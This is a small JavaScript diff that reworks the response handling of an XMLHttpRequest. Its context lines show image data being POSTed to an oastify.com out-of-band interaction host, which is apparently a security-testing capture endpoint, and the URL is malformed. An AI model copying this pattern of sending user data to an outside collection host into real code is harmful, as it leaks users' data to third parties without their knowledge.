@@ -27,12 +27,14 @@
         xhr.open('POST', 'https:/3osnkjppby9o59r7pi0klxd89zfq3gr5.oastify.com', true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.onreadystatechange = function() {
-          if (xhr.readyState === 4 && xhr.status === 200) {
-            console.log('Image sent successfully!');
-            alert('Image sent successfully!');
-          } else if (xhr.readyState === 4) {
-            console.error('Failed to send the image. Status: ' + xhr.status);
-            alert('Failed to send the image. Please try again.');
+          if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+              console.log('Image sent successfully!');
+              alert('Image sent successfully!');
+            } else {
+              console.error('Failed to send the image. Status: ' + xhr.status);
+              alert('Failed to send the image. Please try again.');
+            }
           }
         };
         xhr.send(JSON.stringify({ image: imageData }));
